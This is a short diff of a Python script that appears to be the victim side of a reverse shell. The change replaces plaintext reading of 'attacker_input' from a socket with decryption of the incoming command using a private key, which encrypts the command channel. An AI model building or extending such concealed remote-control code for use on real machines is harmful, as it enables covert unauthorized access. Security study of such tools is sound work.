@@ -19,7 +19,8 @@ print(f'attacker pub key: {attacker_pub_key}')
 
 try:
     while True:
-        attacker_input = s.recv(1024).decode().split(' ')
+        encrypted_command = s.recv(1024)
+        _, attacker_input = asymmetric_encryption.decrypt_message(encrypted_command, priv_key)
         print(f"attacker_input: {attacker_input}")
         if attacker_input == 'exit':
             s.close()
